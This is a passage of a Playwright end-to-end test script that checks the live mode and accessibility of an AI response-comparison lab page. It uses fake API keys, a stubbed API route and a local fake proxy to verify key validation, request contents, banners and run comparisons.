// Live-mode and accessibility e2e checks for /lab (independent verification; not run in CI).
//
// Covers live-mode spec v0.2 §7 L1–L8 in a real browser against `next start`, plus the D30 accessibility
// fixes, D34 (one-sided refusal note), D35 (key/provider rule, provider switch clears the key), and the
// site-wide CSP (D32). Every browser request to /api/lab/run is answered by a Playwright test double;
// no real provider is ever called. Keys are obviously fake (`sk-ant-test-…`, `sk-test-…`).
//
// Usage (port 3921 is the verifier's port):
//   cd site && npm run build
//   # Optional but recommended: route the server's outbound traffic to the script's fake proxy, so the
//   # server-side checks can prove where a valid request would go without anything leaving the machine.
//   env NODE_USE_ENV_PROXY=1 https_proxy=http://127.0.0.1:39210 HTTPS_PROXY=http://127.0.0.1:39210 \
//       http_proxy=http://127.0.0.1:39210 HTTP_PROXY=http://127.0.0.1:39210 no_proxy=localhost,127.0.0.1 NO_PROXY=localhost,127.0.0.1 \
//       npx next start -p 3921 > /path/server.log 2>&1 &
//   LAB_URL=http://localhost:3921/lab SERVER_LOG=/path/server.log FAKE_PROXY_PORT=39210 \
//     AXE_PATH=/path/to/axe.min.js EVIDENCE_DIR=/path/to/evidence node tests/e2e/lab-live-smoke.mjs
//
// SERVER_LOG, FAKE_PROXY_PORT, and AXE_PATH are optional; the checks that need them are skipped (and say so) without them.
import { execSync } from "node:child_process";
import { existsSync, mkdirSync, readFileSync } from "node:fs";
import { createRequire } from "node:module";
import net from "node:net";
import { join } from "node:path";

const require = createRequire(import.meta.url);
function loadPlaywright() {
  try {
    return require("playwright");
  } catch {
    const root = execSync("npm root -g").toString().trim();
    return require(join(root, "playwright"));
  }
}
const { chromium } = loadPlaywright();

const LAB = process.env.LAB_URL ?? "http://localhost:3921/lab";
const ORIGIN = new URL(LAB).origin;
const EVIDENCE = process.env.EVIDENCE_DIR ?? "/tmp/lab-live-evidence";
const SERVER_LOG = process.env.SERVER_LOG;
const AXE_PATH = process.env.AXE_PATH;
const PROXY_PORT = process.env.FAKE_PROXY_PORT ? Number(process.env.FAKE_PROXY_PORT) : null;
mkdirSync(EVIDENCE, { recursive: true });

// Obviously fake keys: provider prefix + 32 letters.
const ANT_KEY = "sk-ant-test-VerifierFakeKeyNotRealAbcdefghij";
const OAI_KEY = "sk-test-VerifierFakeKeyNotRealKlmnopqrst";
const KEY_BODIES = [ANT_KEY.slice(12), OAI_KEY.slice(8)];
function leaksKey(text) {
  if (typeof text !== "string") return false;
  if (text.includes(ANT_KEY) || text.includes(OAI_KEY)) return true;
  for (const b of KEY_BODIES) for (let i = 0; i + 10 <= b.length; i++) if (text.includes(b.slice(i, i + 10))) return true;
  return false;
}

/** Reads the key-format hint, the provider-mismatch message, and the key pattern's bounds from the product source. */
function readKeySource() {
  const src = readFileSync(new URL("../../lib/lab/live-key.ts", import.meta.url), "utf8");
  const hint = /export const KEY_FORMAT_HINT = "([^"]+)";/.exec(src)?.[1];
  const provider = /provider: "([^"]+)",/.exec(src)?.[1];
  const bounds = /API_KEY_PATTERN = \/\^\[A-Za-z0-9_-\]\{(\d+),(\d+)\}\$\//.exec(src);
  if (!hint || !provider || !bounds) throw new Error("could not read the key messages from site/lib/lab/live-key.ts");
  return { hint, provider, min: Number(bounds[1]), max: Number(bounds[2]) };
}
const KEY_SOURCE = readKeySource();

/** Reads PROVIDER_MESSAGES (the fixed provider-result messages) from the product source. */
function readProviderMessages() {
  const src = readFileSync(new URL("../../lib/lab/live-messages.ts", import.meta.url), "utf8");
  const block = /export const PROVIDER_MESSAGES = \{([\s\S]*?)\} as const;/.exec(src)?.[1] ?? "";
  const out = Object.fromEntries([...block.matchAll(/^\s*(\w+): "([^"]+)",?$/gm)].map((m) => [m[1], m[2]]));
  const need = ["tokenLimit", "refused", "badKey", "keyDenied", "modelUnavailable", "billing", "rateLimited", "noQuota", "rejected", "unavailable"];
  const missing = need.filter((k) => !out[k]);
  if (missing.length) throw new Error(`could not read PROVIDER_MESSAGES.${missing.join(", ")} from site/lib/lab/live-messages.ts`);
  return out;
}
const PROVIDER_SOURCE = readProviderMessages();

const BANNER_TAIL = "One sample per run; differences between runs can be nondeterministic. A pass means only that the displayed checks passed.";
const ALL_PASS = "All displayed checks passed";
const MSG = {
  noKey: "Enter your API key to run live",
  // Derived from the product's own constants in site/lib/lab/live-key.ts (WCAG 3.3.3 correction hints);
  // the hint's content is checked below against the key pattern, so a stale or empty hint still fails.
  badFormat: `The API key format is not valid — ${KEY_SOURCE.hint}`,
  badProvider: KEY_SOURCE.provider,
  routeKey: `Missing or malformed API key — ${KEY_SOURCE.hint}`,
  keyInInstruction: "Your instruction contains your API key — remove it before running",
  // Provider result messages (D40 included), read from PROVIDER_MESSAGES in site/lib/lab/live-messages.ts:
  // tokenLimit, refused, badKey, keyDenied, modelUnavailable, billing, rateLimited, noQuota, rejected, unavailable.
  ...PROVIDER_SOURCE,
};
const ASYM = (v) => `Only Version ${v} was declined by the provider's safety system (one sample). This asymmetry may itself be the harm under test.`;

const results = [];
const observations = [];
function check(name, ok, detail = "") {
  results.push({ name, ok: !!ok, detail });
  console.log(`${ok ? "PASS" : "FAIL"}  ${name}${detail ? `  [${String(detail).slice(0, 400)}]` : ""}`);
}
function observe(msg) {
  observations.push(msg);
  console.log(`NOTE  ${msg}`);
}
async function step(name, fn) {
  try {
    await fn();
  } catch (e) {
    check(`${name} (step completed without exception)`, false, String(e?.stack ?? e).slice(0, 600));
  }
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

check(
  "D40 the provider messages read from live-messages.ts are pairwise distinct and never empty",
  new Set(Object.values(PROVIDER_SOURCE)).size === Object.keys(PROVIDER_SOURCE).length && Object.values(PROVIDER_SOURCE).every((m) => m.length > 10),
  Object.values(PROVIDER_SOURCE).join(" | "),
);
check(
  "WCAG 3.3.3 the key-format hint (read from live-key.ts) states the enforced length and characters",
  KEY_SOURCE.min === 20 && KEY_SOURCE.max === 256 && new RegExp(`${KEY_SOURCE.min}\\s*[–-]\\s*${KEY_SOURCE.max} characters`).test(KEY_SOURCE.hint) && /letters, numbers, hyphens and underscores/.test(KEY_SOURCE.hint) && /no spaces/.test(KEY_SOURCE.hint),
  KEY_SOURCE.hint,
);

// ---------- fake outbound proxy (server-side checks only) ----------
const proxyLog = [];
let proxyServer = null;
if (PROXY_PORT) {
  proxyServer = net.createServer((sock) => {
    let buf = "";
    sock.on("data", (d) => {
      buf += d.toString("latin1");
      if (buf.includes("\r\n\r\n")) {
        proxyLog.push(buf);
        sock.end("HTTP/1.1 502 Bad Gateway\r\nContent-Length: 0\r\n\r\n");
      }
    });
    sock.on("error", () => {});
  });
  await new Promise((r) => proxyServer.listen(PROXY_PORT, "127.0.0.1", r));
}

// ---------- browser ----------
const browser = await chromium.launch({ headless: true });

/** A new page with console, error, and request capture, and a test double on /api/lab/run. */
async function newLabPage({ viewport = { width: 1280, height: 900 }, clock = false } = {}) {
  const context = await browser.newContext({ viewport, acceptDownloads: true });
  const page = await context.newPage();
  const cap = { console: [], pageErrors: [], requests: [], failed: [], api: [], context };
  page.on("console", (m) => cap.console.push(`${m.type()}: ${m.text()}`));
  page.on("pageerror", (e) => cap.pageErrors.push(String(e)));
  page.on("request", (r) => cap.requests.push({ url: r.url(), method: r.method(), headers: r.headers(), post: r.postData() ?? "" }));
  page.on("requestfailed", (r) => cap.failed.push({ url: r.url(), error: r.failure()?.errorText ?? "" }));
  cap.handler = okHandler();
  await page.route("**/api/lab/run", async (route) => {
    const req = route.request();
    let body = null;
    try {
      body = JSON.parse(req.postData() ?? "");
    } catch {}
    const entry = { t: Date.now(), headers: req.headers(), raw: req.postData() ?? "", body, url: req.url(), method: req.method(), fulfilledAt: null };
    cap.api.push(entry);
    const r = await cap.handler(entry);
    if (r.hang) return; // never answered; the page must abort it
    if (r.delay) await sleep(r.delay);
    if (r.abort) return route.abort("failed").catch(() => {});
    entry.fulfilledAt = Date.now();
    await route
      .fulfill({ status: r.status ?? 200, contentType: "application/json", headers: { "cache-control": "no-store" }, body: typeof r.body === "string" ? r.body : JSON.stringify(r.body) })
      .catch(() => {});
  });
  if (clock) await page.clock.install();
  return { page, cap };
}

/** Each allowlisted model reports its own dated model id (as the real providers do). */
const RETURNED_BY_MODEL = {
  "claude-haiku-4-5": "claude-haiku-4-5-20251001",
  "claude-sonnet-5-5": "claude-sonnet-5-5-20260901",
  "gpt-4o-mini": "gpt-4o-mini-2024-07-18",
  "gpt-4.1-mini": "gpt-4.1-mini-2025-04-14",
};
function perModelHandler({ failB = false } = {}) {
  return (e) => {
    const id = RETURNED_BY_MODEL[e.body?.model] ?? "unknown-model";
    if (failB && e.body?.variant === "b") return { body: { status: "model_error", error: "Provider unavailable", durationMs: 5 } };
    return okHandler({ returned: { a: id, b: id } })(e);
  };
}

const SPOUSE_BAD = {
  a: "Happy to help! To add your wife, Jordan Lee, as an authorized user, sign in and open Authorized users.",
  b: "To add your partner, Jordan Lee, as an authorized user, please send a marriage certificate and a government-issued photo ID.",
};
const SPOUSE_GOOD = {
  a: SPOUSE_BAD.a,
  b: "Happy to help! To add your husband, Jordan Lee, as an authorized user, sign in and open Authorized users.",
};
/** Default double: answers like a provider would, by variant; the spouse answer improves when FIX-VERIFY is in the instruction. */
function okHandler({ returned = { a: "claude-haiku-4-5-20251001", b: "claude-haiku-4-5-20251001" }, delay = 150 } = {}) {
  return (e) => {
    const v = e.body?.variant === "b" ? "b" : "a";
    const fixed = String(e.body?.instruction ?? "").includes("Apply identical verification requirements");
    const text = e.body?.scenarioId === "spouse-parity" ? (fixed ? SPOUSE_GOOD : SPOUSE_BAD)[v] : "Thanks for reaching out. Here is a short, neutral reply.";
    return { delay, body: { status: "ok", text, returnedModel: returned[v], stopReason: "end_turn", durationMs: 1234 } };
  };
}

// ---------- page helpers ----------
const editAlerts = (page) => page.evaluate(() => [...document.querySelectorAll("section[aria-labelledby=edit] [role=alert]")].map((a) => a.textContent.trim()));
const headline = (page) => page.locator("section[aria-labelledby=findings] p.text-xl").first().innerText();
const compareText = (page) => page.locator("section[aria-labelledby=compare]").innerText();
const inspectText = (page) => page.locator("section[aria-labelledby=inspect]").innerText();
const bannerText = (page) => page.locator("[role=note]").first().innerText();
/**
 * F2: alerts name the run they belong to. The label is derived from the displayed run's own metadata
 * ("Run ID" spouse-parity-run-7 → "Run 7"; the precomputed baseline → "Baseline run"), so an alert
 * is only accepted when its label matches the run on screen.
 */
async function shownRunLabel(page) {
  const id = await page.evaluate(() => {
    const dts = [...document.querySelectorAll("section[aria-labelledby=inspect] dt")];
    const dt = dts.find((d) => (d.textContent ?? "").trim() === "Run ID");
    return (dt?.nextElementSibling?.textContent ?? "").trim();
  });
  const m = /-run-(\d+)$/.exec(id);
  return m ? `Run ${m[1]}` : id.endsWith("-baseline") ? "Baseline run" : `(unknown run id ${id})`;
}
/** Splits "Run 7: text" into its label and text. */
function splitLabel(alert) {
  const m = /^(Run \d+|Baseline run): ([\s\S]*)$/.exec(alert ?? "");
  return m ? { label: m[1], text: m[2] } : { label: null, text: alert };
}
const activeId = (page) => page.evaluate(() => document.activeElement?.id ?? "");
const activeText = (page) => page.evaluate(() => (document.activeElement?.textContent ?? "").trim());
const statusTexts = (page) => page.evaluate(() => [...document.querySelectorAll("[role=status]")].map((s) => s.textContent ?? ""));
async function waitRun(page, n, timeout = 20000) {
  await page.waitForFunction((k) => [...document.querySelectorAll("[role=status]")].some((s) => (s.textContent ?? "").includes(`Run ${k} complete`)), n, { timeout });
}
async function setSource(page, value) {
  await page.locator(`input[name=response-source][value=${value}]`).check();
}
async function selectScenario(page, id) {
  await page.locator(`input[name=scenario][value=${id}]`).check();
}
async function addPreset(page, id) {
  await page.getByRole("button", { name: new RegExp(id) }).click();
}
function parseSummary(t) {
  const m = /(\d+) improved · (\d+) regressed · (\d+) unchanged · (\d+)\s+inconclusive/.exec(t);
  return m ? { improved: +m[1], regressed: +m[2], unchanged: +m[3], inconclusive: +m[4] } : null;
}
const runBaselineLive = (page) => page.getByRole("button", { name: "Run baseline live" }).click();
const rerun = (page) => page.getByRole("button", { name: "Rerun", exact: true }).click();

let axeSource = null;
if (AXE_PATH && existsSync(AXE_PATH)) axeSource = readFileSync(AXE_PATH, "utf8");
async function axeScan(page, label) {
  if (!axeSource) return null;
  await page.addScriptTag({ content: axeSource });
  const res = await page.evaluate(async () => {
    // eslint-disable-next-line no-undef
    const r = await axe.run(document, { runOnly: { type: "tag", values: ["wcag2a", "wcag2aa", "wcag21a", "wcag21aa", "wcag22aa"] } });
    return r.violations.map((v) => ({ id: v.id, impact: v.impact, nodes: v.nodes.length, targets: v.nodes.map((n) => n.target.join(" ")) }));
  });
  observe(`axe (${label}): ${res.length === 0 ? "no violations" : res.map((v) => `${v.id}×${v.nodes} [${v.targets.join(" | ")}]`).join("; ")}`);
  return res;
}

// =====================================================================================
// A. Live panel, notice, and L1 (no key / malformed key → inline error, focus, no request)
// =====================================================================================
const main = await newLabPage();
const { page } = main;
let simAxe = null;
await step("A. load and live panel", async () => {
  const res = await page.goto(LAB, { waitUntil: "networkidle" });
  check("LOAD /lab returns 200", res?.status() === 200);
  simAxe = await axeScan(page, "simulated mode, initial");
  check("L7 no live panel and no key field in simulated mode", (await page.locator("#lab-live-key").count()) === 0);
  await setSource(page, "live");
  const key = page.locator("#lab-live-key");
  await key.waitFor();
  const attrs = await key.evaluate((el) => ({
    type: el.getAttribute("type"),
    autocomplete: el.getAttribute("autocomplete"),
    valueAttr: el.getAttribute("value"),
    inForm: !!el.closest("form"),
    label: document.querySelector(`label[for="${el.id}"]`)?.textContent ?? "",
    describedby: el.getAttribute("aria-describedby") ?? "",
  }));
  check("LIVE key field: password type, autocomplete off, no value attribute, outside any form", attrs.type === "password" && attrs.autocomplete === "off" && attrs.valueAttr === null && !attrs.inForm, JSON.stringify(attrs));
  check("LIVE key field labelled 'Your Anthropic API key' and described by the notice", attrs.label === "Your Anthropic API key" && attrs.describedby.includes("lab-live-notice"), JSON.stringify(attrs));
  const notice = await page.locator("#lab-live-notice").innerText();
  check("LIVE notice names the intermediary '(hosted on Vercel)' and the provider (D33, spec §1)", /this site's server \(hosted on Vercel\) and (on )?to Anthropic/.test(notice), notice.replace(/\n/g, " "));
  check("LIVE notice: 2 billed calls, low-limit revocable key, no personal data", /2 billed calls/.test(notice) && /low-limit key you can revoke/.test(notice) && /personal data/.test(notice));
  const models = await page.locator("#lab-live-model option").allInnerTexts();
  check("LIVE model select lists only the Anthropic allowlist for Anthropic", models.length === 2 && models.every((m) => /claude-(haiku-4-5|sonnet-5-5)\)/.test(m)), models.join(" | "));
  await page.locator("#lab-live-provider").selectOption("openai");
  const oModels = await page.locator("#lab-live-model option").allInnerTexts();
  check("LIVE model select lists only the OpenAI allowlist for OpenAI", oModels.length === 2 && oModels.every((m) => /gpt-(4o-mini|4\.1-mini)\)/.test(m)), oModels.join(" | "));
  await page.locator("#lab-live-provider").selectOption("anthropic");
  // Show / hide.
  await key.fill(ANT_KEY);
  const toggle = page.getByRole("button", { name: /^(Show|Hide) key$/ });
  check("LIVE show/hide toggle starts unpressed", (await toggle.getAttribute("aria-pressed")) === "false");
  await toggle.click();
  check("LIVE the toggle reveals the key (type=text, aria-pressed=true)", (await key.getAttribute("type")) === "text" && (await toggle.getAttribute("aria-pressed")) === "true");
  await toggle.click();
  check("LIVE the toggle masks it again (type=password, aria-pressed=false)", (await key.getAttribute("type")) === "password" && (await toggle.getAttribute("aria-pressed")) === "false");
  await page.getByRole("button", { name: "Clear key" }).click();
  check("L4 Clear key empties the field and keeps focus on it", (await key.inputValue()) === "" && (await activeId(page)) === "lab-live-key");
});

await step("A. L1 no key or a malformed key: inline error, focus to the key field, no request", async () => {
  const key = page.locator("#lab-live-key");
  const cases = [
    ["empty", "", MSG.noKey, "Run baseline live"],
    ["empty (Rerun)", "", MSG.noKey, "Rerun"],
    ["whitespace only", "   ", MSG.noKey, "Run baseline live"],
    ["internal space", "sk-ant-test-Verifier FakeKeyNotRealAbcdefghij", MSG.badFormat, "Run baseline live"],
    ["zero-width space U+200B", "sk-ant-test-Verifier​FakeKeyNotRealAbcdefghij", MSG.badFormat, "Rerun"],
    ["19 characters", "sk-ant-aaaaaaaaaaaa", MSG.badFormat, "Run baseline live"],
    ["OpenAI-shaped key with Anthropic selected", OAI_KEY, MSG.badProvider, "Run baseline live"],
  ];
  for (const [name, value, msg, button] of cases) {
    await key.fill(value);
    const before = main.cap.requests.filter((r) => r.url.includes("/api/lab/run")).length;
    const apiBefore = main.cap.api.length;
    await page.getByRole("button", { name: button, exact: true }).focus();
    await page.keyboard.press("Enter");
    await sleep(400);
    const alerts = await page.evaluate(() => [...document.querySelectorAll("#lab-live-key-error[role=alert]")].map((a) => a.textContent.trim()));
    const after = main.cap.requests.filter((r) => r.url.includes("/api/lab/run")).length;
    const btnEnabled = await page.getByRole("button", { name: button, exact: true }).isEnabled();
    const invalid = await key.getAttribute("aria-invalid");
    check(`L1 ${name} (${button}): inline alert '${msg}.'`, alerts.length === 1 && alerts[0] === `${msg}.`, JSON.stringify(alerts));
    check(`L1 ${name}: focus moved to the key field`, (await activeId(page)) === "lab-live-key", await activeId(page));
    check(`L1 ${name}: no network request`, after === before && main.cap.api.length === apiBefore, `${before}->${after}`);
    check(`L1 ${name}: button stays enabled, field marked aria-invalid`, btnEnabled && invalid === "true", `${btnEnabled} ${invalid}`);
  }
  // Typing clears the error.
  await key.fill("");
  await key.type("s");
  check("L1 typing in the key field clears the inline error", (await page.locator("#lab-live-key-error").count()) === 0);
  await key.fill("");
});

// =====================================================================================
// B. L2/L3/L6: live baseline → rerun → compare; labels follow the displayed run
// =====================================================================================
const SPOUSE_BASELINE = await page.locator("#lab-instruction").inputValue();
await step("B. live baseline then rerun (L2, L3, L6)", async () => {
  await page.locator("#lab-live-key").fill(ANT_KEY);
  check("L2 before any live run: compare says 'No live run yet'", (await compareText(page)).includes("No live run yet"), (await compareText(page)).slice(0, 200));
  main.cap.api.length = 0;
  await runBaselineLive(page);
  await waitRun(page, 1);
  const api = main.cap.api.slice();
  check("L3 one baseline run sends exactly two requests (A and B)", api.length === 2, String(api.length));
  const variants = api.map((e) => e.body?.variant).sort().join(",");
  check("L3 the two requests are Version A and Version B", variants === "a,b", variants);
  const keysOk = api.every((e) => e.body && Object.keys(e.body).sort().join(",") === "instruction,model,provider,scenarioId,scenarioVersion,variant");
  check("L3 request body has exactly scenarioId, scenarioVersion, variant, instruction, provider, model (no input text)", keysOk, api.map((e) => Object.keys(e.body ?? {}).join("+")).join(" | "));
  check("L3 'Run baseline live' sends the unedited baseline instruction verbatim", api.every((e) => e.body?.instruction === SPOUSE_BASELINE));
  check("L3 A and B carry identical scenario, version, instruction, provider, and model", new Set(api.map((e) => JSON.stringify({ ...e.body, variant: undefined }))).size === 1);
  check("L3 provider/model are the selected allowlisted pair", api.every((e) => e.body?.provider === "anthropic" && e.body?.model === "claude-haiku-4-5" && e.body?.scenarioVersion === "1"));
  check("L3 the client never sends the scenario input text", api.every((e) => !/Jordan Lee|my husband|my wife/.test(e.raw)));
  check("L4 key sent only as 'Authorization: Bearer <key>'", api.every((e) => e.headers.authorization === `Bearer ${ANT_KEY}` && !leaksKey(e.raw) && !leaksKey(e.url)));
  check("L3 method POST, JSON content type, same-origin URL", api.every((e) => e.method === "POST" && /^application\/json/.test(e.headers["content-type"] ?? "") && e.url === `${ORIGIN}/api/lab/run`));
  const sorted = api.slice().sort((x, y) => x.t - y.t);
  check("L3 A and B run concurrently (the second request starts before the first is answered)", sorted[1].t <= (sorted[0].fulfilledAt ?? Infinity), `${sorted[1].t - sorted[0].t} ms apart`);

  const banner = await bannerText(page);
  check("L6 live banner: provider, returned model, single-sample disclaimer (exact)", banner.trim() === `Live run: responses from Anthropic claude-haiku-4-5-20251001. ${BANNER_TAIL}`, banner);
  const inspect = await inspectText(page);
  check("L6 run metadata: Live badge, requested and returned model, temperature 0, max tokens 1024", /Mode\s+Live/.test(inspect) && inspect.includes("Requested model") && inspect.includes("claude-haiku-4-5-20251001") && /Temperature\s+0/.test(inspect) && /Max tokens\s+1024/.test(inspect), inspect.slice(-600).replace(/\n/g, " "));
  check("L6 live responses are not labeled 'Simulated response'", !inspect.includes("Simulated response") && /Duration\s+A: \d+ ms; B: \d+ ms/.test(inspect));
  check("L2 after a live baseline only: 'Live baseline only — edit and rerun'", (await compareText(page)).includes("Live baseline only — edit and rerun"));
  check("L6 no alert for an all-ok live run", (await editAlerts(page)).length === 0, JSON.stringify(await editAlerts(page)));
  await page.screenshot({ path: join(EVIDENCE, "verifier-live-01-baseline.png"), fullPage: false });

  // Edit and rerun.
  await addPreset(page, "FIX-VERIFY");
  await addPreset(page, "FIX-TERMS");
  const edited = await page.locator("#lab-instruction").inputValue();
  main.cap.api.length = 0;
  await rerun(page);
  await waitRun(page, 2);
  check("L3 Rerun sends the edited instruction exactly as typed, for both versions", main.cap.api.length === 2 && main.cap.api.every((e) => e.body?.instruction === edited), String(main.cap.api.length));
  const cmp = await compareText(page);
  const sum = parseSummary(cmp);
  check("L2 live baseline + rerun produce a comparable pair (summary table shown)", !!sum && sum.improved > 0 && sum.regressed === 0 && !cmp.includes("Not comparable"), JSON.stringify(sum));
  check("L2 comparison shows both run metadata blocks as Live", (cmp.match(/Mode\s+Live/g) ?? []).length === 2, cmp.slice(0, 200));
  check("L2 an edited rerun is not labeled run-to-run variation", !cmp.includes("run-to-run variation"));
  await page.locator("section[aria-labelledby=compare]").scrollIntoViewIfNeeded();
  await page.screenshot({ path: join(EVIDENCE, "verifier-live-02-compare.png"), fullPage: false });

  // L6: the banner follows the displayed run, not the radio.
  await page.locator("input[name=view-run][value=baseline]").check();
  const b1 = await bannerText(page);
  check("L6 showing the precomputed simulated baseline while 'Live' is selected → simulated banner", b1.startsWith("Simulated demo — no AI model is called") && /Mode\s+Simulated/.test(await inspectText(page)), b1.slice(0, 80));
  await page.locator("input[name=view-run][value=latest]").check();
  check("L6 back to the latest live run → live banner", (await bannerText(page)).startsWith("Live run: responses from Anthropic"));
  await setSource(page, "simulated");
  check("L6 switching the radio to Simulated does not relabel the displayed live run", (await bannerText(page)).startsWith("Live run: responses from Anthropic") && /Mode\s+Live/.test(await inspectText(page)));
  await setSource(page, "live");
  check("L4 switching to simulated and back leaves the key field empty", (await page.locator("#lab-live-key").inputValue()) === "");
});

await step("B. same instruction twice → run-to-run variation (L2)", async () => {
  await page.locator("#lab-live-key").fill(ANT_KEY);
  await runBaselineLive(page);
  await waitRun(page, 3);
  await runBaselineLive(page);
  await waitRun(page, 4);
  const cmp = await compareText(page);
  check("L2 two runs of the unedited instruction compare, every row labeled 'run-to-run variation (same instruction)'", !!parseSummary(cmp) && (cmp.match(/run-to-run variation \(same instruction\)/g) ?? []).length >= 3, cmp.slice(0, 300).replace(/\n/g, " "));
  check("L2 same-instruction comparison says the instruction is unchanged", cmp.includes("Instruction unchanged"));
});

await step("B. mismatched returned model ids (L2)", async () => {
  main.cap.handler = okHandler({ returned: { a: "claude-haiku-4-5-20251001", b: "claude-haiku-4-5-20260101" } });
  await rerun(page);
  await waitRun(page, 5);
  const cmp = await compareText(page);
  check("L2 A and B answered by different model versions → 'Not comparable' with the reason", cmp.includes("Not comparable: Versions A and B were answered by different model versions") && !parseSummary(cmp), cmp.slice(0, 200));
  const banner = await bannerText(page);
  check("L6 banner names both returned models when they differ", banner.includes("claude-haiku-4-5-20251001 (Version A) / claude-haiku-4-5-20260101 (Version B)"), banner);
  main.cap.handler = okHandler({ returned: { a: "claude-haiku-4-5-20260101", b: "claude-haiku-4-5-20260101" } });
  await rerun(page);
  await waitRun(page, 6);
  const cmp2 = await compareText(page);
  check("L2 the two runs answered by different model versions → 'Not comparable'", cmp2.includes("Not comparable") && /Different model versions answered the two runs/.test(cmp2), cmp2.slice(0, 200));
  main.cap.handler = okHandler();
  // A different requested model is never compared with the Haiku baseline.
  await page.locator("#lab-live-model").selectOption("claude-sonnet-5-5");
  await rerun(page);
  await waitRun(page, 7);
  const cmp3 = await compareText(page);
  check("L2 a run with a different requested model is not compared with the Haiku baseline", !parseSummary(cmp3) || cmp3.includes("Not comparable"), cmp3.slice(0, 200));
  const inspect = await inspectText(page);
  check("L6 Sonnet 5.5 run shows temperature n/a (omitted), never 0", /Temperature\s+n\/a/.test(inspect));
  await page.locator("#lab-live-model").selectOption("claude-haiku-4-5");
});

await step("B. live vs simulated never compare (L2)", async () => {
  await setSource(page, "simulated");
  await rerun(page);
  await waitRun(page, 8);
  const cmp = await compareText(page);
  check("L2 a simulated rerun compares with the simulated baseline (both Simulated)", (cmp.match(/Mode\s+Simulated/g) ?? []).length === 2 && !/Mode\s+Live/.test(cmp), cmp.slice(0, 200));
  check("L6 simulated run → simulated banner", (await bannerText(page)).startsWith("Simulated demo — no AI model is called"));
  await setSource(page, "live");
  await page.locator("#lab-live-key").fill(ANT_KEY);
  await rerun(page);
  await waitRun(page, 9);
  const cmp2 = await compareText(page);
  check("L2 the next live rerun compares only with a live baseline", !cmp2.includes("Mode\nSimulated") && !/Mode\s+Simulated/.test(cmp2), cmp2.slice(0, 200));
});

await step("B. baseline had errors; no live run yet (L2 empty states)", async () => {
  await selectScenario(page, "stated-identity");
  check("L2 a scenario with no live run: 'No live run yet'", (await compareText(page)).includes("No live run yet"));
  main.cap.handler = () => ({ status: 500, body: { status: "model_error", message: "Internal error" } });
  await runBaselineLive(page);
  await waitRun(page, 1);
  check("L2 a failed live baseline: 'Live baseline had errors — run it again'", (await compareText(page)).includes("Live baseline had errors — run it again"), (await compareText(page)).slice(0, 200));
  main.cap.handler = okHandler();
  await addPreset(page, "FIX-PRONOUNS");
  await rerun(page);
  await waitRun(page, 2);
  check("L2 an edited rerun after a failed baseline is not compared with it", (await compareText(page)).includes("Live baseline had errors — run it again"), (await compareText(page)).slice(0, 200));
  await selectScenario(page, "spouse-parity");
});

// =====================================================================================
// B1 (PO real-key smoke test): a new model's baseline is a baseline; spec §4 baseline selection
// =====================================================================================
/** The two RunMeta blocks in "5. Compare runs" as {label: value} maps, plus the refusal text if any. */
const compareMeta = (p) =>
  p.evaluate(() => {
    const sec = document.querySelector("section[aria-labelledby=compare]");
    const out = { text: sec?.innerText ?? "", notComparable: null, baseline: null, latest: null };
    out.notComparable = [...sec.querySelectorAll("p")].map((x) => x.textContent ?? "").find((t) => t.startsWith("Not comparable:")) ?? null;
    for (const title of sec.querySelectorAll("p")) {
      const t = (title.textContent ?? "").trim();
      if (t !== "Baseline run" && t !== "Latest run") continue;
      const dl = title.parentElement.querySelector("dl");
      const map = {};
      const dts = [...dl.querySelectorAll("dt")];
      for (const dt of dts) map[(dt.textContent ?? "").trim()] = (dt.nextElementSibling?.textContent ?? "").trim();
      out[t === "Baseline run" ? "baseline" : "latest"] = map;
    }
    return out;
  });

await step("B1 the PO's sequence: Haiku baseline → Sonnet baseline → Sonnet edited → Haiku edited → other model", async () => {
  const t = await newLabPage();
  const p = t.page;
  await p.goto(LAB, { waitUntil: "networkidle" });
  await p.locator("input[name=response-source][value=live]").check();
  await p.locator("#lab-live-key").fill(ANT_KEY);
  t.cap.handler = perModelHandler();
  let n = 0;
  const go = async (button) => {
    await p.getByRole("button", { name: button, exact: true }).click();
    await waitRun(p, ++n);
    return compareMeta(p);
  };
  // 1. Haiku baseline.
  let c = await go("Run baseline live");
  check("B1 step 1 Haiku baseline → 'Live baseline only — edit and rerun'", c.text.includes("Live baseline only — edit and rerun") && !c.notComparable, c.text.slice(0, 200));
  // 2. Switch to Sonnet 5.5 and run its baseline: the reported bug showed "Not comparable: config differs".
  await p.locator("#lab-live-model").selectOption("claude-sonnet-5-5");
  c = await go("Run baseline live");
  check("B1 step 2 Sonnet baseline after a Haiku baseline → 'Live baseline only — edit and rerun', not 'config differs'", c.text.includes("Live baseline only — edit and rerun") && !c.notComparable && !c.text.includes("config differs"), c.text.slice(0, 220));
  check("B1 step 2 the banner shows Sonnet's returned model", (await bannerText(p)).includes("claude-sonnet-5-5-20260901"));
  // 3. Edit and rerun on Sonnet: Sonnet vs Sonnet.
  await addPreset(p, "FIX-VERIFY");
  await addPreset(p, "FIX-TERMS");
  c = await go("Rerun");
  check(
    "B1 step 3 Sonnet edited rerun compares with the Sonnet baseline (run 2), Sonnet vs Sonnet",
    !c.notComparable && !!parseSummary(c.text) && c.baseline?.["Run ID"] === "spouse-parity-run-2" && c.baseline?.["Requested model"] === "claude-sonnet-5-5" && c.latest?.["Requested model"] === "claude-sonnet-5-5" && c.baseline?.["Returned model"] === "claude-sonnet-5-5-20260901" && c.latest?.["Returned model"] === "claude-sonnet-5-5-20260901",
    JSON.stringify({ nc: c.notComparable, b: c.baseline?.["Run ID"], bm: c.baseline?.["Requested model"], lm: c.latest?.["Requested model"] }),
  );
  check("B1 step 3 both comparison columns show Temperature n/a (Sonnet omits it)", c.baseline?.Temperature === "n/a" && c.latest?.Temperature === "n/a");
  // 4. Back to Haiku, still edited: compares with the Haiku baseline (run 1).
  await p.locator("#lab-live-model").selectOption("claude-haiku-4-5");
  c = await go("Rerun");
  check(
    "B1 step 4 Haiku edited rerun compares with the Haiku baseline (run 1), Haiku vs Haiku",
    !c.notComparable && !!parseSummary(c.text) && c.baseline?.["Run ID"] === "spouse-parity-run-1" && c.baseline?.["Requested model"] === "claude-haiku-4-5" && c.latest?.["Requested model"] === "claude-haiku-4-5",
    JSON.stringify({ nc: c.notComparable, b: c.baseline?.["Run ID"], bm: c.baseline?.["Requested model"], lm: c.latest?.["Requested model"] }),
  );
  // 5. Another model with no baseline of its own, edited: the actionable reason.
  await p.locator("#lab-live-provider").selectOption("openai");
  await p.locator("#lab-live-key").fill(OAI_KEY);
  await p.locator("#lab-live-model").selectOption("gpt-4o-mini");
